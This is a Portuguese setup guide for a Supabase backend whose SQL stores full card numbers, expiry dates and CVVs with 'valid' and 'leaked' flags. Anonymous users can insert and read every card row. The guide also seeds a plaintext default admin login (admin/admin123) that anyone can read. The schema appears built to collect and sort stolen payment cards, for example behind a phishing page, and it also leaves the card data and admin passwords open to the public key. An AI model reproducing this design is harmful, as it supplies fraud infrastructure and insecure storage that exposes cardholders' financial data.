# Configuração do Supabase

## 1. Criar projeto no Supabase

1. Acesse https://supabase.com e crie uma conta
2. Crie um novo projeto
3. Copie a URL e a chave anon (Settings > API)

## 2. Criar tabelas

Execute o seguinte SQL no SQL Editor do Supabase:

```sql
-- Tabela de cartões
CREATE TABLE cartoes (
  id SERIAL PRIMARY KEY,
  numero_cartao TEXT NOT NULL,
  validade TEXT NOT NULL,
  cvv TEXT NOT NULL,
  valido BOOLEAN NOT NULL DEFAULT false,
  vazado BOOLEAN NOT NULL DEFAULT false,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Tabela de credenciais admin
CREATE TABLE admin_credentials (
  id SERIAL PRIMARY KEY,
  username TEXT NOT NULL UNIQUE,
  password TEXT NOT NULL
);

-- Inserir credencial admin padrão (username: admin, password: admin123)
INSERT INTO admin_credentials (username, password)
VALUES ('admin', 'admin123');

-- Políticas de segurança (RLS)
ALTER TABLE cartoes ENABLE ROW LEVEL SECURITY;
ALTER TABLE admin_credentials ENABLE ROW LEVEL SECURITY;

-- Permitir inserção anônima na tabela cartoes
CREATE POLICY "Allow anonymous insert" ON cartoes
  FOR INSERT TO anon WITH CHECK (true);

-- Permitir select anônimo na tabela cartoes (para o admin)
CREATE POLICY "Allow anonymous select" ON cartoes
  FOR SELECT TO anon USING (true);

-- Permitir select na tabela admin_credentials
CREATE POLICY "Allow admin select" ON admin_credentials
  FOR SELECT TO anon USING (true);
```

## 3. Configurar variáveis de ambiente

Copie `.env.example` para `.env` e preencha com suas credenciais:

```bash
VITE_SUPABASE_URL=https://seu-projeto.supabase.co
VITE_SUPABASE_ANON_KEY=sua_chave_anon_aqui
```
